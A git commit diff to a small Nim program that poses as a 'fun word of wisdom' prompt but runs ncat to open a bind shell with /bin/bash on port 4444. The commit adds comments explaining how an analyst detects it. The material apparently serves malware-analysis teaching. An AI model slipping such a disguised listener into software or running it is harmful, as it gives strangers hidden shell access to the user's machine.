c46761c4685f5a7bafe9ff9c1675b34aa0fbc7c8
generic <generic@localspot>
2023-02-19 22:39:04 -0500

    added basic analysis

--- bindShell.nim
+++ bindShell.nim
@@ -12,3 +12,14 @@ echo "Press enter for a fun word of wisdom. :)"
 discard readline(stdin)
 
 discard execCmd("ncat -l 4444 -e /bin/bash &")
+
+
+# This is an example of a very basic bind shell -
+# It does nothing to hide the fact that it has shellcode calling
+# an ncat binary to listen.
+# reversing its behavior is extremely easy with a simple 
+# strings bindShell | grep bash
+# pointing you directly to the shellcode.
+# As a network analyst, running netstat on your endpoint will clue you in to an
+# errant ncat connection as well.
+# Lets see what we find in wireshark though, when we sniff traffic!
